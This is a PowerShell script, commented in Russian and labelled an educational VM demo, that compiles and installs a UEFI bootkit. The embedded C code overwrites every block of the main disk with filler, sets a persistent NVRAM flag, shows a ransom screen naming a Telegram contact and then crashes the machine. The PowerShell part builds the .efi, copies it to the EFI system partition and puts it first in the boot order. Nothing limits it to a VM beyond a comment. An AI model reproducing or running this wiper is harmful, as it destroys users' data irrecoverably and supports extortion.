#Requires -RunAsAdministrator
<#
    BIOSware UEFI Bootkit DEMO + 16 МБ chunks
    ТОЛЬКО ДЛЯ УЧЕБНЫХ ЦЕЛЕЙ В ВМ!
#>

$sourceCode = @'
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Protocol/BlockIo.h>
#include <Guid/GlobalVariable.h>

#define WAIT_BEFORE_BSOD   30
#define CONTACT_TG         L"@unhook_proxy"

EFI_EVENT   TimerEvent = NULL;
BOOLEAN     bLocked = FALSE;

VOID ShowLockScreen(VOID)
{
    Print(L"\n\n");
    Print(L"  ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗\n");
    Print(L"  ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║\n");
    Print(L"  ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║\n");
    Print(L"  ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║\n");
    Print(L"  ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║\n");
    Print(L"  ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝\n\n");
    Print(L"  ╔═══════════════════════════════════════════════════════════╗\n");
    Print(L"  ║              YOUR FILES ARE ENCRYPTED!                    ║\n");
    Print(L"  ║   Telegram: %s                                            ║\n", CONTACT_TG);
    Print(L"  ║   UEFI Bootkit DEMO — данные уничтожаются на уровне firmware║\n");
    Print(L"  ╚═══════════════════════════════════════════════════════════╝\n");
}

VOID EFIAPI TimerHandler(IN EFI_EVENT Event, IN VOID *Context)
{
    static UINTN Counter = 0;
    if (!bLocked) { ShowLockScreen(); bLocked = TRUE; }
    Counter++;
    if (Counter >= WAIT_BEFORE_BSOD) {
        gBS->CloseEvent(TimerEvent);
        Print(L"\n[!] TRIGGERING BSOD...\n");
        __asm volatile("ud2");
        while(1);
    }
}

// ==================== ДЕМОНСТРАЦИЯ 16 МБ ЧАНКОВ ====================
VOID DemonstrateDiskChunks(VOID)
{
    EFI_STATUS Status;
    EFI_HANDLE *HandleBuffer = NULL;
    UINTN HandleCount = 0, i;
    EFI_BLOCK_IO_PROTOCOL *BlockIo;
    UINTN BlockSize;
    UINT64 TotalBlocks, TotalSizeMB;
    UINTN ChunkSize = 16 * 1024 * 1024;
    UINTN ChunksProcessed = 0;

    Print(L"\n[+] === ДЕМОНСТРАЦИЯ ВРЕДА UEFI BOOTKIT ===\n");
    Print(L"[+] Разбиваем диск на куски по 16 МБ...\n\n");

    Status = gBS->LocateHandleBuffer(ByProtocol, &gEfiBlockIoProtocolGuid, NULL, &HandleCount, &HandleBuffer);
    if (EFI_ERROR(Status)) return;

    for (i = 0; i < HandleCount; i++) {
        Status = gBS->HandleProtocol(HandleBuffer[i], &gEfiBlockIoProtocolGuid, (VOID**)&BlockIo);
        if (EFI_ERROR(Status) || !BlockIo->Media->MediaPresent || BlockIo->Media->LogicalPartition) continue;

        BlockSize = BlockIo->Media->BlockSize;
        TotalBlocks = BlockIo->Media->LastBlock + 1;
        TotalSizeMB = (TotalBlocks * BlockSize) / (1024 * 1024);

        if (TotalSizeMB < 800) continue;

        Print(L"[+] Найден основной диск: ~%d МБ\n", TotalSizeMB);
        
        UINTN TotalChunks = (TotalSizeMB + 15) / 16;
        UINTN j;
        for (j = 0; j < TotalChunks; j++) {
            UINT64 LBA = (j * (UINT64)ChunkSize) / BlockSize;
            UINTN BlocksInChunk = ChunkSize / BlockSize;
            if (LBA + BlocksInChunk > TotalBlocks) BlocksInChunk = (UINTN)(TotalBlocks - LBA);

            UINT8 *Buffer = AllocatePool(ChunkSize);
            if (Buffer) {
                SetMem(Buffer, ChunkSize, (UINT8)(0xBA + (j % 64)));
                BlockIo->WriteBlocks(BlockIo, BlockIo->Media->MediaId, LBA, ChunkSize, Buffer);
                FreePool(Buffer);
            }

            ChunksProcessed++;
            Print(L"[*] Кусок %4d/%d | 16 МБ | LBA: %8d\n", ChunksProcessed, TotalChunks, LBA);
            gBS->Stall(60000);
        }
        break;
    }
    if (HandleBuffer) FreePool(HandleBuffer);
    Print(L"\n[+] ДЕМОНСТРАЦИЯ ЗАВЕРШЕНА — %d кусков по 16 МБ!\n", ChunksProcessed);
}

EFI_STATUS InstallPersistence(VOID)
{
    UINT32 Flag = 1;
    return gRT->SetVariable(L"BIOSware_Active", &gEfiGlobalVariableGuid,
                EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
                sizeof(Flag), &Flag);
}

EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
{
    gST = SystemTable;
    gBS = SystemTable->BootServices;
    gRT = SystemTable->RuntimeServices;

    Print(L"\n[+] BIOSware UEFI Bootkit DEMO\n");

    UINTN DataSize = 0;
    if (gRT->GetVariable(L"BIOSware_Active", &gEfiGlobalVariableGuid, NULL, &DataSize, NULL) == EFI_NOT_FOUND) {
        InstallPersistence();
    }

    DemonstrateDiskChunks();
    ShowLockScreen();

    gBS->CreateEvent(EVT_TIMER | EVT_NOTIFY_SIGNAL, TPL_CALLBACK, TimerHandler, NULL, &TimerEvent);
    gBS->SetTimer(TimerEvent, TimerRelative, 10000000ULL);

    while(1) gBS->Stall(1000000);
    return EFI_SUCCESS;
}
'@

# ============================================================
function Install-Clang {
    Write-Host "[+] Проверяем Clang..." -ForegroundColor Cyan
    if (Get-Command clang -ErrorAction SilentlyContinue) { 
        Write-Host "[+] Clang уже работает" -ForegroundColor Green
        return 
    }

    Write-Host "[+] Устанавливаем LLVM..." -ForegroundColor Cyan
    winget install LLVM.LLVM -e --silent --accept-source-agreements --accept-package-agreements

    $llvmPath = "C:\Program Files\LLVM\bin"
    if (Test-Path $llvmPath) {
        $env:Path += ";$llvmPath"
        [Environment]::SetEnvironmentVariable("Path", $env:Path, "Machine")
        Write-Host "[+] Путь к LLVM добавлен" -ForegroundColor Green
    }

    Start-Sleep -Seconds 3
}

function Get-UefiHeaders {
    $path = "$env:TEMP\edk2-headers"
    if (!(Test-Path "$path\edk2-master")) {
        Write-Host "[+] Скачиваем UEFI заголовки..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri "https://github.com/tianocore/edk2/archive/refs/heads/master.zip" -OutFile "$env:TEMP\edk2.zip"
        Expand-Archive "$env:TEMP\edk2.zip" -DestinationPath $path -Force
    }
    return "$path\edk2-master"
}

function Compile-Efi {
    param([string]$SourceFile)

    Install-Clang
    $edk = Get-UefiHeaders

    Write-Host "[+] Компилируем RealRansom.efi..." -ForegroundColor Cyan

    $obj = "RealRansom.obj"
    $efi = "RealRansom.efi"

    clang -target x86_64-pc-windows-msvc -ffreestanding -fshort-wchar -mno-red-zone `
          -I"$edk\MdePkg\Include" -I"$edk\MdePkg\Include\X64" `
          -c "$SourceFile" -o $obj

    lld-link /NOLOGO /SUBSYSTEM:EFI_APPLICATION /ENTRY:UefiMain /MACHINE:X64 $obj /OUT:$efi

    if (Test-Path $efi) {
        Write-Host "[+] Компиляция успешна!" -ForegroundColor Green
        return $efi
    } else {
        Write-Host "[-] Ошибка компиляции!" -ForegroundColor Red
        exit 1
    }
}

function Install-Bootkit {
    param([string]$EfiFile)

    Write-Host "[+] Монтируем ESP..." -ForegroundColor Cyan
    $esp = Get-Partition | Where-Object {$_.Type -like "*System*" -and $_.Size -lt 500MB} | Select-Object -First 1

    mountvol X: /D 2>$null
    mountvol X: $esp.UniqueId

    New-Item -Path "X:\EFI\BIOSware" -ItemType Directory -Force | Out-Null
    Copy-Item $EfiFile "X:\EFI\BIOSware\RealRansom.efi" -Force

    Write-Host "[+] Добавляем в Boot Order..." -ForegroundColor Cyan
    $guid = bcdedit /create /d "BIOSware Demo" /application BOOTSECTOR | Select-String '{.*}' | % {$_.Matches.Value}
    bcdedit /set $guid path "\EFI\BIOSware\RealRansom.efi"
    bcdedit /displayorder $guid /addfirst

    mountvol X: /D
    Write-Host "[+] Bootkit установлен!" -ForegroundColor Green
}

# ============================================================
Write-Host "=== BIOSware UEFI Demo для ПТУ ===" -ForegroundColor Magenta

$tempC = "$env:TEMP\RealRansom.c"
$sourceCode | Out-File $tempC -Encoding utf8 -Force

$efi = Compile-Efi -SourceFile $tempC
Install-Bootkit -EfiFile $efi

Write-Host "`nГотово! Сделай снапшот и перезагружай ВМ." -ForegroundColor Green
